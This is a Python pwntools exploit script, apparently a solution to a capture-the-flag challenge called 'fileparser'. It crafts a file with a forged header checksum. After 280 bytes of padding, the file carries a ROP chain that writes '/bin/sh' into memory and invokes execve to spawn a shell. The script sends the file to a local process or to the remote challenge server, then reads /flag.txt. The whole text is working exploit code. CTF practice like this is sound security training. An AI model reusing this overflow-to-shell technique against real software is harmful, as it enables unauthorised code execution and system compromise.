#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF('fileparser_patched', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

debug = lambda msg: log.debug(msg)
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
error = lambda msg: log.error(msg)
critical = lambda msg: log.critical(msg)
warning = lambda msg: log.warning(msg)

s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)

sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

# 0x000000000043f99b : mov qword ptr [rdi], rax ; ret
# 0x000000000047ae62 : pop rdi ; ret
# 0x000000000047f6cf : pop rsi ; ret
# 0x0000000000429bc3 : pop rax ; ret
# 0x000000000040147b : syscall

mov_qword_ptr_rdi_rax_ret = 0x43f99b
pop_rdi = 0x47ae62
pop_rsi = 0x47f6cf
pop_rax = 0x429bc3
syscall = 0x40147b

filename = '/tmp/ovf.k'

header = 0x07030301
payload = flat(
    cyclic(280),
    pop_rdi, 0x4b4000,
    pop_rax, u64(b'/bin/sh\x00'),
    mov_qword_ptr_rdi_rax_ret,
    pop_rdi, 0x4b4000,
    pop_rsi, 0,
    pop_rax, 0x3b,
    syscall
)

length = len(payload)

q = header | (length << 32)

checksum = ( ~((q * 0xAABBCCDDDEADBEEF) & 0xffffffffffffffff)) & 0xffffffffffffffff

with open(filename, 'wb') as f:
    f.write(struct.pack( '<IIQ', header, length, checksum))
    f.write(payload)

print(f"length   = {length}")
print(f"checksum = {checksum:#018x}")

if args.GDB:
    p = gdb.debug(
        [exe.path, filename],
        gdbscript='''
        set follow-fork-mode parent
        b *0x401F9F

        c
        '''
    )

elif args.REMOTE:
    p = remote('fileparser-0dce9cab8809.chall.nnsc.tf', 1337, ssl=True)
    with open(filename, 'rb') as f:
        file_b64 = base64.b64encode(f.read())

    p.sendlineafter( b'Send over your file as base64: ', file_b64 )
    p.sendline(b'cat /flag.txt')

elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path, filename])

sl(b'cat /flag.txt')


p.interactive()